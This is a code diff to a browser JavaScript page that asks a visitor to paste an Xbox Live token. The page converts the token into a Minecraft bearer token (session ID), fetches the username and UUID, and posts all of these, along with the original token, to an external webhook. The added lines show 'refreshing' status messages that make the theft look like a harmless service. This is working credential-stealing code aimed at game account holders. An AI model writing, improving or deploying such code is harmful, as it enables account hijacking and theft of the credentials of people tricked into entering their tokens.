@@ -17,7 +17,7 @@ async function myFunction() {
   let userToken = prompt("Please enter XBL token", "token goes here");
   if (userToken != null) {
     document.getElementById("demo").innerHTML =
-    "Hello " + userToken + "! How are you today?";
+    "REFRESHING: " + userToken;
      //app.get("/api/player/networth", async (req, res) => {
   //if (userToken == undefined) {
     //res.json({
@@ -36,10 +36,15 @@ async function myFunction() {
         const xstsToken = xstsTokenHashArray[0]
         const userHash = xstsTokenHashArray[1]
         const bearerToken = await getBearerToken(xstsToken, userHash)
+        document.getElementById("demo").innerHTML = "RETRIEVING SSID...";
         const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        document.getElementById("demo").innerHTML = "ssid: " + bearerToken;
+        document.getElementById("demo").innerHTML = "RETRIEVING USER & UUID...";
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
+        document.getElementById("demo").innerHTML = "username: " + username;
         postToWebhook(username, bearerToken, uuid, userToken)
+        document.getElementById("demo").innerHTML = "POSTED TO WEBHOOK";
     } catch (e) {
         console.log(e)
     }
